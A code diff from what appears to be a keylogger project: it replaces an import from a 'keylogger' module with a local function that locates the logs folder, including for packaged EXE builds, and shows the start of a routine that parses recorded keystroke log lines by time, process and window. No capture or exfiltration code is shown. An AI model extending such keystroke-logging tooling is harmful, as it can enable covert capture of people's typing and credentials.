@@ -1,10 +1,34 @@
 import os
 import re
-from keylogger import get_log_dir
 
+
+# Убираем импорт keylogger, чтобы избежать circular import
+# Вместо этого создаем локальную функцию get_log_dir
+
+def get_log_dir():
+    """
+    Локальная версия функции получения пути к папке logs.
+    """
+    import sys
+    if getattr(sys, 'frozen', False):
+        # Для EXE: logs рядом с исполняемым файлом
+        base_dir = os.path.dirname(sys.executable)
+        log_dir = os.path.join(base_dir, 'logs')
+    else:
+        # Для Python: logs в корне проекта
+        base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+        log_dir = os.path.join(base_dir, 'logs')
+
+    # Нормализуем путь
+    log_dir = os.path.normpath(log_dir)
+
+    # Создаем папку если ее нет
+    os.makedirs(log_dir, exist_ok=True)
+    return log_dir
 
 
 def process_line(line: str) -> str:
+    # ... существующий код без изменений ...
     # Отделяем префикс (время + процесс + окно) от содержимого нажатий клавиш
     # Шаблон ищет: время - [процесс] - "окно" - содержимое
     match = re.match(r"^(.*? - \[.*?\] - \".*?\" - )(.*)$", line)
